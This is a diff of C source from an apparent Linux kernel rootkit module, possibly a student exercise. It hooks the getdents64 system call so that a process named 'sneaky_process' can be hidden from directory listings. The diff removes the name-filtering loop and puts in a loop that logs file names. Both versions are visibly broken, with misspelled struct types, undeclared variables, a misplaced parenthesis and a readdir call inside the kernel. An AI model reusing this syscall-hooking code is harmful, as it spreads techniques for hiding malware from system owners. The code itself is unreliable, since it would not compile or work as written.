@@ -66,23 +66,25 @@ asmlinkage int (*original_getdents64)(struct pt_regs *);
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
 {  
   int original_result =  (*original_getdents64)(regs);
-  int curr_pos = 0;
-  int new_result = 0;
+  
+  
   struct linux_dirent64 * curr_dirp = regs->si;
-  struct linux_dirent64 * new_dirp;
-  struct linix_dirent64 * curr_new_dirp = new_dirp;
+  struct linux_dirent64 * prev_dirp = curr_new_dirp;
 
-  while(curr_pos < original_result){
-    if(strcmp(curr->d_name, "sneaky_process" != 0){
-	new_result += curr_dirp->d_reclen;
-	memcpy (curr_new_dirp, curr_dirp, curr_dirp->d_reclen);
-      }
-      else{
-	printk(KERN_INFO "Skipping \n");
-      }
+  for (curr_pos = 0; curr_pos < original_result;) {
+     printk(KERN_INFO "File name %s \n", curr_dirp->d_name);  
+    prev_dirp = (struct linix_dirent64 *) curr_dirp;
     curr_pos += curr_dirp->d_reclen;
+    curr_dirp = (struct linix_dirent64 *) (regs->si + curr_pos);
+    
   }
-  printk(KERN_INFO "Here %s \n", original_dirp->d_name);
+  
+  /**
+  while(curr_dirp != NULL){
+    prev_dirp = (struct linix_dirent64 *) curr_dirp;
+    curr_dirp = readdir(curr_dirp) 
+  }
+  **/
   return original_result;
 }
 
